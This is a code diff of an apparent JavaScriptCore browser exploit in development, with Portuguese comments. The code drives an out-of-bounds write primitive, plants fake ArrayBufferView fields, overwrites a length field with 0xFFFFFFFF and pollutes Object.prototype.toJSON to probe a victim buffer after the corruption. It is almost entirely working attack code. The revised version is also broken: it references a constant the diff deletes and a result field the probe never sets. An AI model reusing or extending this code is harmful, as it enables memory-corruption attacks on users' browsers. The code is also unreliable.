@@ -11,177 +11,112 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// ============================================================
-// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
-// ============================================================
-const FNAME_MAIN = "ExploitLogic_v24_SelfCorruptAndProbe_FixRef"; // Nova versão com correção
+const FNAME_MAIN = "ExploitLogic_v25_MinimalVictimProbe";
 
-// --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
-const FAKE_VIEW_BASE_OFFSET_IN_OOB    = 0x58;
-const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
-const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
-const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
-const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
-const FAKE_VIEW_CELLINFO_STATE        = 0x01;
-const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
-const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero;
-const FAKE_VIEW_MLENGTH_INITIAL_PLANT = 0x100;      
-const FAKE_VIEW_MMODE_VALUE           = 0x00000000;
-
-// --- Constantes para a Corrupção Crítica ---
-// Calculado dinamicamente na função principal usando JSC_OFFSETS
-// const CRITICAL_OOB_WRITE_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
 const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
+const VICTIM_AB_SIZE = 64;
 
-// --- Marcadores para Leitura via Potencial SuperView ---
-const OOB_BUFFER_MARKER_OFFSET = 0x0; 
-const OOB_BUFFER_MARKER_VALUE  = 0x41424344; // 'ABCD'
-const OTHER_SID_READ_OFFSET    = 0x400; 
-const OTHER_SID_READ_VALUE     = 0xFEEDFACE;
+let minimal_probe_results = null;
 
-let getter_probe_details_v24 = null; // Renomeado para v24
-
-// ============================================================
-// FUNÇÃO toJSON Poluída para Sondar 'this' (que será o oob_array_buffer_real)
-// ============================================================
-// Definição da função ANTES de ser usada.
-function toJSON_ProbeArrayBufferState_v24() { // Mantendo o nome para consistência com o log
-    const FNAME_toJSON = "toJSON_ProbeArrayBufferState_v24";
-    
-    getter_probe_details_v24 = {
-        toJSON_executed: FNAME_toJSON,
-        this_type: "N/A",
-        this_byteLength: "N/A",
-        read_at_0: "N/A",
-        read_at_fake_view_sid: "N/A",
-        read_at_other_sid: "N/A",
+function toJSON_MinimalProbeOnVictim() {
+    const FNAME_toJSON = "toJSON_MinimalProbeOnVictim";
+    minimal_probe_results = {
+        probe_called: true,
+        this_type: "N/A_before_call",
         error: null
     };
-
     try {
-        getter_probe_details_v24.this_type = Object.prototype.toString.call(this);
-        
-        if (!(this instanceof ArrayBuffer)) {
-            getter_probe_details_v24.error = "CRITICAL: 'this' is not an ArrayBuffer in toJSON_ProbeArrayBufferState_v24.";
-            // Evitar logS3 diretamente daqui em caso de estado muito instável
-            return getter_probe_details_v24;
-        }
-
-        getter_probe_details_v24.this_byteLength = this.byteLength;
-
-        if (this.byteLength === CRITICAL_OOB_WRITE_VALUE) {
-            // Só logar de dentro se for o caso MUITO interessante
-            // logS3(`[${FNAME_toJSON}] SUCCESS? 'this' (oob_ab) tem byteLength = ${toHex(this.byteLength)}. Lendo...`, "vuln", FNAME_toJSON);
-            try {
-                const temp_view = new Uint32Array(this); 
-                getter_probe_details_v24.read_at_0 = toHex(temp_view[OOB_BUFFER_MARKER_OFFSET / 4]);
-                getter_probe_details_v24.read_at_fake_view_sid = toHex(temp_view[FAKE_VIEW_BASE_OFFSET_IN_OOB / 4]);
-                getter_probe_details_v24.read_at_other_sid = toHex(temp_view[OTHER_SID_READ_OFFSET / 4]);
-            } catch (e_read) {
-                getter_probe_details_v24.error = (getter_probe_details_v24.error || "") + ` Error reading elements: ${e_read.message}`;
-            }
-        }
-    } catch (e_main) {
-        getter_probe_details_v24.error = (getter_probe_details_v24.error || "") + ` General error in toJSON: ${e_main.name} - ${e_main.message}`;
+        // Apenas a operação mais básica para ver se 'this' é acessível
+        minimal_probe_results.this_type = Object.prototype.toString.call(this); 
+        // Não logar daqui para ser o mais leve possível
+    } catch (e) {
+        minimal_probe_results.error = `${e.name}: ${e.message}`;
     }
-    return getter_probe_details_v24;
+    return minimal_probe_results; // Retorna o objeto diretamente
 }
 
-// ============================================================
-// FUNÇÃO PRINCIPAL (v24_SelfCorruptAndProbe_FixRef)
-// ============================================================
-export async function sprayAndInvestigateObjectExposure() { 
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.selfCorruptAndProbe`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Corromper oob_array_buffer_real e Sondá-lo (FixRef) ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `SelfCorrupt v24_FixRef Test...`;
+export async function sprayAndInvestigateObjectExposure() {
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.minimalVictimProbe`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Sondagem Mínima em victim_ab Pós-Corrupção ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `MinimalVictimProbe v25`;
 
-    getter_probe_details_v24 = null; 
+    minimal_probe_results = null;
     let errorCaptured = null;
     let stringifyResult = null;
     let potentiallyCrashed = true; 
+    let stepReached = "init";
 
-    // Calcular o offset crítico dinamicamente
-    let critical_oob_write_offset_calculated = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
-    logS3(`   Offset de escrita crítica calculado: ${toHex(critical_oob_write_offset_calculated)} (0x58 + ${JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET})`, "info", FNAME_CURRENT_TEST);
-
+    // Calcular o offset de corrupção crítico
+    // Usa ArrayBufferView.M_LENGTH_OFFSET porque a ESTRUTURA FAKE que plantamos era de uma View,
+    // e o 0x70/0x7C era o m_length dessa estrutura fake.
+    // A escrita OOB é no oob_array_buffer_real, mas o offset é relevante para a *estrutura* que estava lá.
+    const critical_oob_write_offset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70 padrão, ou 0x7C se M_LENGTH_OFFSET é 0x24
+    // Para ser mais preciso com o log anterior que mostrou 0x7C:
+    // const critical_oob_write_offset_calc = 0x58 + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
+    // logS3(`  (Nota: Offset 0x70 usado nos textos anteriores. Com M_LENGTH_OFFSET=${JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET}, o offset de m_length da view em 0x58 seria ${toHex(critical_oob_write_offset_calc)})`, "info", FNAME_CURRENT_TEST);
+    // Vamos usar o 0x70 (ou 0x7C) que causava o problema. Se M_LENGTH_OFFSET é 0x24, o 0x7C é o que queremos.
+    const M_LENGTH_OFFSET_IN_VIEW_STRUCT = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
+    const corruptionTargetOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + M_LENGTH_OFFSET_IN_VIEW_STRUCT; // Ex: 0x58 + 0x24 = 0x7C
 
     try {
+        stepReached = "oob_setup";
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        logS3(`PASSO 1: Plantando estrutura fake em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} com m_length=${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT)}...`, "info", FNAME_CURRENT_TEST);
-        const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, 16);
-        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET, 16);
-        const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET, 16);
-        const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 16);
-        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16); 
-        const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET, 16);
+        // PASSO 1 (Opcional, mas mantido para consistência com o que causava o crash): Plantar a estrutura fake com m_length seguro
+        // Isso assegura que oob_array_buffer_real[0x7C] (ou 0x70) é tocado com um valor antes de ser sobrescrito.
+        const FAKE_VIEW_MLENGTH_INITIAL_PLANT_TEMP = 0x100; 
+        const mLengthOffset_temp  = FAKE_VIEW_BASE_OFFSET_IN_OOB + M_LENGTH_OFFSET_IN_VIEW_STRUCT;
+        oob_write_absolute(mLengthOffset_temp, FAKE_VIEW_MLENGTH_INITIAL_PLANT_TEMP, 4);
+        logS3(`PASSO 1: Valor inicial ${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT_TEMP)} escrito em oob_ab[${toHex(mLengthOffset_temp)}] (m_length da estrutura fake).`, "info", FNAME_CURRENT_TEST);
 
-        oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
-        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1);
-        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
-        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
-        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
-        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); 
-        oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
-        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_INITIAL_PLANT, 4); 
-        oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
-        logS3(`  Estrutura fake plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}.`, "good", FNAME_CURRENT_TEST);
-
-        oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
-        logS3(`  Plantado Marcador OOB (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
-        oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
-        logS3(`  Plantado Outro Marcador (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
+        // PASSO 2: Escrita OOB CRÍTICA em oob_array_buffer_real
+        stepReached = "critical_oob_write";
+        logS3(`PASSO 2: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffset)}]...`, "warn", FNAME_CURRENT_TEST);
+        oob_write_absolute(corruptionTargetOffset, CRITICAL_OOB_WRITE_VALUE, 4); // Escreve 0xFFFFFFFF
+        logS3(`  Escrita crítica em ${toHex(corruptionTargetOffset)} realizada.`, "info", FNAME_CURRENT_TEST);
         
         await PAUSE_S3(50);
 
-        logS3(`PASSO 2: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(critical_oob_write_offset_calculated)}]...`, "warn", FNAME_CURRENT_TEST);
-        oob_write_absolute(critical_oob_write_offset_calculated, CRITICAL_OOB_WRITE_VALUE, 4);
-        logS3(`  Escrita crítica em ${toHex(critical_oob_write_offset_calculated)} realizada. m_length da estrutura fake em 0x58 agora deve ser ${toHex(CRITICAL_OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
-        
-        await PAUSE_S3(50);
-        
-        logS3(`PASSO 3: Tentando JSON.stringify(oob_array_buffer_real) com ${toJSON_ProbeArrayBufferState_v24.name}...`, "test", FNAME_CURRENT_TEST);
+        // PASSO 3: Criar victim_ab e tentar JSON.stringify com toJSON poluído
+        stepReached = "victim_creation";
+        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
+        logS3(`PASSO 3: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_MinimalProbeOnVictim.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
         let pollutionApplied = false;
 
         try {
+            stepReached = "pp_pollution";
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_ProbeArrayBufferState_v24, // Usando a função definida neste arquivo
+                value: toJSON_MinimalProbeOnVictim,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_MinimalProbeOnVictim.name}.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`  Chamando JSON.stringify(oob_array_buffer_real)...`, "info", FNAME_CURRENT_TEST);
-            stringifyResult = JSON.stringify(oob_array_buffer_real); 
+            stepReached = "before_stringify_victim";
+            logS3(`  Chamando JSON.stringify(victim_ab)...`, "info", FNAME_CURRENT_TEST);
+            stringifyResult = JSON.stringify(victim_ab); 
             potentiallyCrashed = false; 
             
-            logS3(`  JSON.stringify completou. Resultado (getter_probe_details_v24): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify(victim_ab) completou. Resultado da toJSON: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
-            if (stringifyResult) {
-                if (stringifyResult.error) {
-                    logS3(`    ERRO DENTRO da toJSON: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
-                }
-                if (stringifyResult.this_byteLength === CRITICAL_OOB_WRITE_VALUE) {
-                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' (oob_array_buffer_real) no toJSON tem byteLength IGUAL ao CRITICAL_OOB_WRITE_VALUE!", "vuln", FNAME_CURRENT_TEST);
-                    logS3(`      Leitura de this[0] (OOB_MARKER): ${stringifyResult.read_at_0}`, "leak", FNAME_CURRENT_TEST);
-                    logS3(`      Leitura de this[0x58/4] (FAKE_SID): ${stringifyResult.read_at_fake_view_sid}`, "leak", FNAME_CURRENT_TEST);
-                    logS3(`      Leitura de this[0x400/4] (OTHER_SID): ${stringifyResult.read_at_other_sid}`, "leak", FNAME_CURRENT_TEST);
-                    document.title = "SelfCorrupt SUCCESS: OOB_AB size & R/W OK?";
-                } else if (typeof stringifyResult.this_byteLength === 'number') {
-                    logS3(`    INFO: oob_array_buffer_real.byteLength (em toJSON) = ${stringifyResult.this_byteLength} (esperado ${toHex(CRITICAL_OOB_WRITE_VALUE)} ou ${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT)})`, "info", FNAME_CURRENT_TEST);
-                }
+            if (stringifyResult && stringifyResult.error) {
+                logS3(`    ERRO DENTRO da toJSON_MinimalProbeOnVictim: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
+                errorCaptured = new Error(stringifyResult.error); // Para que seja pego pelo log de erro geral
+            } else if (stringifyResult && stringifyResult.probe_called) {
+                logS3(`    toJSON_MinimalProbeOnVictim foi chamada. Tipo de 'this': ${stringifyResult.this_type_in_probe}`, "good", FNAME_CURRENT_TEST);
             }
 
         } catch (e_stringify) {
             errorCaptured = e_stringify;
             potentiallyCrashed = false;
-            logS3(`  ERRO CRÍTICO durante JSON.stringify(oob_array_buffer_real): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `SelfCorrupt JSON_CRASH: ${e_stringify.name}`;
+            stepReached = "error_in_stringify";
+            logS3(`  ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
+            document.title = `MinimalProbe CRASH: ${e_stringify.name}`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
@@ -197,8 +132,7 @@ export async function sprayAndInvestigateObjectExposure() {
         document.title = `${FNAME_MAIN} FALHOU: ${e_main.name}`;
     } finally {
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
+        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${stepReached}) Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
-    // Retornar o objeto com os resultados para o orquestrador
-    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult, getter_probe_details: getter_probe_details_v24 };
+    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult, getter_probe_details: minimal_probe_results };
 }
